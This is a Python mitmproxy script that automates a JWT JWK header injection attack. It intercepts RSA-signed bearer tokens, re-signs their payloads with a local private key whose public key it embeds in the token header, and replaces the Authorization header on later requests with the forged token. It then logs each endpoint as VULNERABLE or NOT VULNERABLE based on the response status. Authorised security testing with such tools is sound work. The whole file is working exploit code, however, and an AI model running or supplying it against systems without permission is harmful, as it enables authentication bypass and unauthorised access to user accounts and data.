from mitmproxy import http
import jwt
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from datetime import datetime
import os

RESULT_FILE = "jwt_attack_results_script4.txt"
STATIC_ENDPOINT_FILE = "jwt_endpoints_static.txt"

RSA_ALGS = {"RS256", "RS384", "RS512"}
HMAC_ALGS = {"HS256", "HS384", "HS512"}

baseline = {}          # (method, path) -> status
tested = set()         # endpoints already logged
forged_token = None    # forged JWT or False if not applicable

PRIVATE_KEY_PATH = "private_key.pem"

# ---------------- helpers ----------------

def load_static_endpoints():
    if not os.path.exists(STATIC_ENDPOINT_FILE):
        return set()
    with open(STATIC_ENDPOINT_FILE) as f:
        return {
            line.strip().split("?")[0]
            for line in f
            if line.strip() and not line.startswith("#")
        }

STATIC_ENDPOINTS = load_static_endpoints()

def b64url(data: bytes):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def extract_token(flow):
    auth = flow.request.headers.get("Authorization", "")
    if auth.lower().startswith("bearer "):
        return auth[7:]

    for cookie in flow.request.cookies.values():
        if "." in cookie:
            return cookie
    return None

def log_result(flow, result, verdict, confidence):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    size = len(flow.response.content or b"")

    with open(RESULT_FILE, "a") as f:
        f.write(
            f"[{ts}]\n"
            f"ATTACK: JWT JWK Header Injection\n"
            f"METHOD: {flow.request.method}\n"
            f"URL: {flow.request.path}\n"
            f"STATUS: {flow.response.status_code}\n"
            f"RESPONSE_SIZE: {size} bytes\n"
            f"RESULT: {result}\n"
            f"VERDICT: {verdict}\n"
            f"CONFIDENCE: {confidence}\n"
            f"{'-'*60}\n\n"
        )

# ---------------- forging logic ----------------

def forge_jwk_token(token):
    header = jwt.get_unverified_header(token)
    alg = header.get("alg")

    # 🔒 HMAC → not applicable
    if alg in HMAC_ALGS:
        return None, "HMAC"

    if alg not in RSA_ALGS:
        return None, "UNKNOWN"

    payload = jwt.decode(token, options={"verify_signature": False})

    with open(PRIVATE_KEY_PATH, "rb") as f:
        private_key = serialization.load_pem_private_key(
            f.read(), password=None, backend=default_backend()
        )

    pub = private_key.public_key().public_numbers()
    jwk = {
        "kty": "RSA",
        "e": b64url(pub.e.to_bytes((pub.e.bit_length() + 7) // 8, "big")),
        "n": b64url(pub.n.to_bytes((pub.n.bit_length() + 7) // 8, "big")),
        "kid": header.get("kid", "attacker-jwk"),
    }

    headers = {
        "alg": alg,
        "jwk": jwk,
        "kid": jwk["kid"],
    }

    forged = jwt.encode(payload, private_key, algorithm=alg, headers=headers)
    return forged, "FORGED"

# ---------------- mitmproxy hooks ----------------

def request(flow: http.HTTPFlow):
    global forged_token

    path = flow.request.path.split("?")[0]
    if STATIC_ENDPOINTS and path not in STATIC_ENDPOINTS:
        return

    token = extract_token(flow)
    if not token:
        return

    # ---------- BASELINE ----------
    if forged_token is None:
        forged, status = forge_jwk_token(token)

        # HS256 / HMAC case → log immediately
        if status == "HMAC":
            forged_token = False
            log_result(
                flow,
                result="JWK header injection not applicable to HMAC-based JWTs",
                verdict="NOT VULNERABLE",
                confidence="HIGH"
            )
            tested.add((flow.request.method, path))
            return

        if forged:
            forged_token = forged
        return

    # ---------- FORGED REQUEST ----------
    if forged_token:
        flow.request.headers["Authorization"] = f"Bearer {forged_token}"

def response(flow: http.HTTPFlow):
    path = flow.request.path.split("?")[0]
    key = (flow.request.method, path)

    if STATIC_ENDPOINTS and path not in STATIC_ENDPOINTS:
        return

    if key in tested:
        return

    tested.add(key)

    status = flow.response.status_code

    if forged_token and status not in (401, 403):
        log_result(
            flow,
            result="Application accepted attacker-controlled JWK header",
            verdict="VULNERABLE",
            confidence="HIGH"
        )
    else:
        log_result(
            flow,
            result="JWK header ignored or signature verification enforced",
            verdict="NOT VULNERABLE",
            confidence="HIGH"
        )
